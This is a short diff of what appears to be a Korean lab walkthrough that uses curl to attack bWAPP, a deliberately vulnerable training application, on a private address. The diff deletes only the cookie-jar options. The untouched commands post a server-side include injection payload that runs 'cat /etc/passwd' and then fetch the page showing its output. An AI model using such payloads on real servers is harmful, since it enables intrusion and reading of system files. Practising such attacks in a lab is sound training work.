@@ -79,7 +79,6 @@
 # 1. ssii.php 폼에 악의적인 SSI 명령어(Payload) 전송
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST \
      -d 'firstname=<!--#exec cmd="cat /etc/passwd"-->&lastname=test&form=submit' \
      "http://192.168.0.20/bWAPP/ssii.php"
@@ -97,7 +96,6 @@ curl -s \
 # 2. 실행 결과를 담은 페이지(ssii.shtml) 호출
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      "http://192.168.0.20/bWAPP/ssii.shtml" | head -n 25
 ```
 
